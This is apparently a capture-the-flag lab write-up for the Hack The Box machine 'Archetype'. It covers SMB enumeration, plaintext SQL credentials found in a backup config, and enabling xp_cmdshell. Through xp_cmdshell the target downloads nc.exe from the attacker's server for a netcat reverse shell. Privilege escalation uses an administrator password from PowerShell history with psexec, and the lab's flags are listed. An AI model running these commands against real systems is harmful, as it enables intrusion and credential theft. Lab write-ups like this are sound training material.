# Archetype

## Ifconfig

```
inet 10.10.14.69  netmask 255.255.254.0
inet6 fe80::d484:44d2:fd97:c02c
```

## nmap

> sudo nmap -sC -sV -A 10.10.10.27

```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM

target name: ARCHETYPE
Host script results:
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2021-09-19T08:27:51
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-19T01:27:52-07:00
|_clock-skew: mean: 1h49m02s, deviation: 3h07m52s, median: 25m01s
```

## Smbclient

- List sharename

> smbclient -L 10.10.10.27

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

- Attempt to login

> smbclient //10.10.10.27/ADMIN$

```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

> smbclient //10.10.10.27/backups

login success

- Get prod.dtsConfig info

> allinfo prod.dtsConfig

```
altname: PROD~1.DTS
create_time:    一  1月 20 20時20分57秒 2020 CST
access_time:    一  1月 20 20時23分02秒 2020 CST
write_time:     一  1月 20 20時23分02秒 2020 CST
change_time:    一  1月 20 20時23分18秒 2020 CST
attributes: RA (21)
stream: [::$DATA], 609 bytes
```

- Find prod.dtsConfig in backups

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
## Impacket

- Format

```
[[domain/]username[:password]@]<targetName or address>
```

> impacket-mssqlclient sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth

- Use sp_configure make sure xp_cmdshell is opened

- Get command from remote

*local upload nc.exe* 

http server default port 8000

> python3 -m http.server 

*remote get nc.exe*

> xp_cmdshell powershell wget http://10.10.14.69:8000/nc.exe -outfile %TEMP%\nc.exe

*local listen port*

> nc -lvnp *port*

*remote give cmd.exe privilege*

> xp_cmdshell powershell %TEMP%\nc.exe -nv 10.10.14.69 *port* -e cmd.exe

```
user.txt
3e7b102e78218e935bf3f4951fec21a3
```

## Get powershell history file

> cd /

- Search any end at history.txt's file

> dir /s *history.txt

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

- type the content

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

> impacket-psexec administrator@10.10.10.27

or

> impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.10.10.27

```
root.txt
b91ccec3305e98240082d4474b848528
```
